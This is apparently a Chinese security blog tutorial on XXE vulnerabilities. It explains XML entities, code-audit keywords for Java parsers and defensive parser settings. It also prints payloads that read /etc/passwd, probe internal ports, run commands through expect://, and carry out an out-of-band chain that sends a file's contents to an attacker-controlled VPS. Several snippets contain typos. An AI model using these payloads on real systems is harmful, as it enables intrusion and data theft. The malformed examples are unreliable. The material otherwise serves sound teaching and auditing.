# XXE漏洞


## XML

XML全称“可扩展标记语言”（extensible markup language），XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。

#### XML文档结构

包括：`XML声明+DTD文档类型定义+文档元素`，例如：

![xml](http://image.xpshuai.cn/img/image-20220118140948748.png)

其中<note>是根元素，所有XML文档必须包含一个根元素，根元素是所有其他元素的父元素。





#### DTD

DTD（document type definition）文档类型定义用于定义XML文档的结构，它作为xml文件的一部分位于XML声明和文档元素之间，比如：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message[
<!ELEMENT message (receiver, sender, heder, msg)>
]>

```

它就定义了 XML 的根元素必须是message，根元素下面有一些子元素，所以 XML必须像下面这么写：

```xml
<message>
    ......其他标签......
</message>
```

DTD需要在`!DOCTYPE`注释中定义根元素，而后在中括号的`[]`内使用！ELEMENT注释定义各元素特征。



#### 实体

如：

```xml
<?xml version = "1.0"?>
<!DOCTYPE fool [
	<!ELEMENT fool ANY>
    <!ENTITY xxe "tttttt">
]>

```

它规定了xml文件的根元素是foo，但ANY说明接受任何元素。重点是`!ENTITY`，这就是我们要提到的实体，**实体本质是定义了一个变量**，变量**名**xxe，值为“test”，后面在 XML 中**通过 & 符号进行引用**，所以根据DTD我们写出下面的xml文件：

```xml
<login>
    <user>&xxe/user>
    <pass></pass>
</login>
```

因为ANY的属性，元素我们可以随意命令，但user值通过&xxe，实际值为test。



#### 外部实体

上面的例子就是**内部实**体。

XML**外部实体**是一种自定义实体，**定义位于声明它们的DTD之外**，声明使用`SYSTEM`关键字，比如加载实体值的URL：

```xml
<?xml version = "1.0"?>
<!DOCTYPE fool [
    <!ENTITY f SYSTEM "http://www.xxx.com">
]>
```

这里URL可以使用file://协议，因此可以从文件加载外部实体。例如：

```xml
<!DOCTYPE fool [
     <!ENTITY f SYSTEM "file:///d://index.txt">
]>
```





## XXE简介

XML外部实体注入（XXE），当应用程序在解析XML输入时，在没有禁止外埠实体的加载而导致加载了外部文件及代码时，就会造成XXE漏洞。

XXE漏洞可通过file协议或ftp协议来读取文件源码，也可以对内网进行探测或攻击。



## 危害

根据有无回显可分为有回显XXE和Blind XXE

**危害：**

- 任意文件读取
- 内网探测：如` <!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >探测端口；`
- 攻击内网站点
- 命令执行：`<!ENTITY xxe SYSTEM "expect://id" >执行命令；`
- DOS攻击
- Bind XXE攻击课用于试试Oob(数据带外攻击)

...











## 挖掘思路

关注可能解析xml格式数据的功能处，较容易发现的是请求包参数包含XML格式数据，不容易发现的是文件上传及数据解析功能处，通过改请求方式、请求头Content-Type等方式进行挖掘。

**三步：**

1. 检测XML是否会被成功解析以及是否支持DTD引用外部实体，有回显或者报错；
2. 若没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据；
3. 最后可以尝试XInclude，某些应用程序接收客户端提交的数据，将其嵌入到服务器端的XML文档中，然后解析文档，尝试payload：

```xml
<fooxmlns:xi=“http://www.w3.org/2001/XInclude”>

<xi:include parse ="text" href="file///etc/passwd"/> </ foo>
```





### 执行系统命令

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
		<! ENTITY xxe SYSTEM "expect://id">
]>
<x>&xxe</x>

```





### 探测内网端口

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE ANY[    
    <!ENTITY port SYSTEM "http://127.0.0.1:80">
]> 
<x>&port;</x>

```



### 读取本地文件

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE ANY[    
    <!ENTITY f SYSTEM "file://etc/passwd">
]> 
<x>&f;</x>

```





### OOB XXE

1.在我们VPS创建一个`test.dtd`文件：

```xmlxml
<xml version="1.0" encoding="UTF-8">
<!ENTITY % file  SYSTEM "file:///var/www/html/flag.txt">
<!ENTITY % all "<!ENTITY xxe SYSTEM 'http://localhost:8888/?text=%file;'>">
%all;

```

2.开始web服务，以便后续步骤可以访问到这个`test.dtd`文件，比如SimpleHTTPServer

3.burp抓包修改数据包, 下面数据包一旦经受害者服务器处理，就会向我们的vps发送请求，查找我们的DTD文件

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY % remote SYSTEM "http://前面vps的ip:8888/test.dtd">
%remote;
]>

<user><username>&xxe;</username><password>admin888</password></user>

```

结果我们vps收到了flag.txt的文件内容，而SimpleHTTPServer也收到了对test.dtd的GET请求





## 代码审计

### XML的常见接口

解析XML常见的方法有四种，即：DOM、DOM4J、JDOM 和SAX。

Java中常用以下常见接口来解析XML语言：

#### 1.XMLReader

当XMLReader使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞



#### 2.SAXBuilder

当SAXBuilder使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞



#### 3.SAxReader





#### 4.AXParserFactory



#### 5.Digester

其触发的xxe漏洞是没有回显的，我们一般需要通过Blind XXE的方法来利用



#### 6.DocumentBuiderFactory





### 挖掘技巧

挖掘XXE漏洞的关键是找到：

**代码是否涉及xml解析——>xml输入是否是外部可控——>是否禁用外部实体（DTD）**

若三个条件满足则存在漏洞。







### 审计关键字

和其他漏洞一样，只不过审计时候搜索的关键字不同，搜索**常见关键字**以快速对代码进行定位：

```bash
Documentbuilder
DocumentBuilderFactory
SAXReader
SAXParser
SAXParserFactory
SAXBuilder
TransformerFactory
reqXml
getInputStream
XMLReaderFactory
.newInstance
SchemaFactory
SAXTransformerFactory
javax.xml.bind
XMLReader
XmlUtils.get
Validator

```



### 例子

这里以xxe-lab为简单例子说明

搜索关键字发现使用了`DocumentBuilderFactory.newInstance()`

![DocumentBuilderFactory](http://image.xpshuai.cn/img/image-20220118151849457.png)

进入代码查看xml是否可控

![查看代码](http://image.xpshuai.cn/img/image-20220118151945401.png)

可以发现：程序首先通过`DocumentBuilderFactory.newInstance()`来获取一个实例，然后通过`DocumentBuilder::parse`来解析，通过`request.getInputStream()`来传入的body内容，并返回一个`Document`实例。

继续跟进，发现直接通过`getValueByTagName`函数获取了username节点的内容并在进行对比数据后将其输出到页面上。也就是说可以通过控制username的值来达到回显xxe的目的。



构造payload：

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [
    <!ENTITY f SYSTEM "file:///d://index.txt">
]>
<user><username>&f;</username><password>admin888</password></user>

```









## 漏洞防御

- 使用XML解析器时需要设置其属性，禁止使用外部实体

```java
//实例化解析类之后常用的禁用外部实体的方法
obj.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
obj.setFeature("http://xml.org/sax/features/external-general-entities",false);
obj.setFeature("http://xml.org/sax/features/external-parameter-entities",false);

// 注意，不同解析库的修复方案不同
```

- 手动黑名单过滤
- 许多第三方组件会爆出xxe漏洞，应避免引入这些组件





## 参考

https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&mid=2247484073&idx=1&sn=483c6a12a0813dc3d608782f455a14e3&chksm=eac0b094ddb7398279a61a6ce506e45a2d89f8db19b5f5a64023ad915c9ffebe405171334919&scene=21#wechat_redirect


---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/xxe%E6%BC%8F%E6%B4%9E/  

